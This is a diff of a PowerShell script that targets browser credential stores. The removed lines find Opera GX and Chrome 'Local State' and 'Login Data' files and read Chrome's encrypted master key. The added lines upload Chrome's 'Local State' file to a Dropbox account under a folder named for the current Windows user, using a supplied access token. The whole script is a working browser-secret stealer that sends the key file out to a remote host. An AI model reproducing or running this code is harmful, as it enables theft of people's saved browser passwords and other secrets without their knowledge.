@@ -1,33 +1,64 @@
+
+param(
+    [Parameter(Mandatory = $true)]
+    [string]$AccessToken
+)
+
 # Specify the path to the Local State file
-$localStateFilePathOpera = "$env:APPDATA\Opera Software\Opera GX Stable\Local State"
-$loginDataFilePathOpera = "$env:APPDATA\Opera Software\Opera GX Stable\Login Data"
-$CHROME_PATH_LOCAL_STATE = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-$CHROME_PATH = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+$paths = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+)
+function Get-CurrentUser {
+    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+    return $currentUser.Name
+}
+
+$currentUser = Get-CurrentUser
+$currentUser = $currentUser -replace "\\", "-"
 
 
-function Get-Key {
+function Upload-ToDropbox {
     Param(
         [Parameter(Mandatory = $true)]
-        [string]$path
-        )
-    # Check if the file exists
-    if (Test-Path -Path $path) {
-        # Read the content of the Local State file
-        $content = Get-Content -Path $path -Raw
+        [string]$FilePath,
+        [Parameter(Mandatory = $true)]
+        [string]$DestinationPath
+    )
 
-        # Convert JSON content to PowerShell object
-        $jsonObject = $content | ConvertFrom-Json
-
-        # Specify the key you want to retrieve
-
-        # Check if the key exists in the JSON object
-        if ($jsonObject.os_crypt.encrypted_key) {
-            # Output the value of the specified key
-            return $jsonObject.os_crypt.encrypted_key
-        } else {
-            Write-Output "Key '$desiredKey' not found in the JSON object."
-        }
-    } else {
-        Write-Output "Local State file not found."
+    $dropboxApiArg = @{
+        "autorename" = $true
+        "mode" = "add"
+        "mute" = $false
+        "path" = "/$(${DestinationPath} -replace "\\", "/")"
+        "strict_conflict" = $false
     }
+    $dropboxApiArgJson = $dropboxApiArg | ConvertTo-Json -Compress
+    $dropboxApiArgJson = $dropboxApiArgJson -replace "`r`n", ""
+    $FilePath = $FilePath -replace "\\", "/"
+    Write-Output "Uploading $FilePath to $DestinationPath"
+    # Send the file content over HTTPS
+    $headers = @{
+        "Authorization" = "Bearer $AccessToken"
+        "Dropbox-API-Arg" = $dropboxApiArgJson
+    }
+    Invoke-WebRequest -Uri "https://content.dropboxapi.com/2/files/upload" `
+        -Method Post `
+        -Headers $headers `
+        -ContentType "application/octet-stream" `
+        -InFile $FilePath
 }
+
+foreach ($path in $paths) {
+    # Get the file name
+    $parentDirectory = Split-Path -Path $path -Parent
+    $grandParentDirectory = Split-Path -Path $parentDirectory -Parent
+    $greatGrandParentDirectory = Split-Path -Path $grandParentDirectory -Parent
+    $relativePath = $path.Replace($greatGrandParentDirectory + "\", "")
+
+    $outPath = $currentUser +"/"+ $relativePath
+
+    Upload-ToDropbox -FilePath $path -DestinationPath $outPath
+
+}
+
